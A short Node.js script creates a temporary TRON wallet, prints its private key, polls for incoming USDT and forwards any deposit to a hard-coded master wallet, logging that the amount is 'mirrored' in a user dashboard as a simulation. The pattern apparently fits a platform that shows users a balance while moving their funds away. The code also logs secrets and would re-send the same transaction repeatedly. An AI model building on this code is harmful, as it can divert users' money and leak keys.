const TronWeb = require('tronweb');
const axios = require('axios');

const MASTER_WALLET = 'TW98PmNm7aFSgZoSzrfTFc4haUwQgvvrdK';
const USDT_CONTRACT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';

function generateTempWallet() {
  const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
  return tronWeb.createAccount();
}

async function monitorAndForward(tempPrivateKey, tempAddress) {
  const tron = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: tempPrivateKey
  });

  setInterval(async () => {
    try {
      const res = await axios.get(`https://api.trongrid.io/v1/accounts/${tempAddress}/transactions/trc20?only_confirmed=true&limit=5`);
      const usdtTx = res.data.data.find(tx => tx.token_info.symbol === 'USDT' && tx.to === tempAddress);

      if (usdtTx && parseFloat(usdtTx.value) > 0) {
        console.log('[✔] Incoming USDT:', usdtTx.value);

        const contract = await tron.contract().at(USDT_CONTRACT);
        await contract.transfer(MASTER_WALLET, usdtTx.value).send();

        console.log(`[↪] Forwarded ${usdtTx.value} USDT to master wallet.`);
        console.log(`[💰] Mirrored $${usdtTx.value} in user dashboard (simulated).`);
      }
    } catch (err) {
      console.error('[!] Error:', err.message);
    }
  }, 15000);
}

(async () => {
  const { address, privateKey } = await generateTempWallet();
  console.log('🧾 Temp Wallet:', address.base58);
  console.log('🔐 Private Key:', privateKey);
  await monitorAndForward(privateKey, address.base58);
})();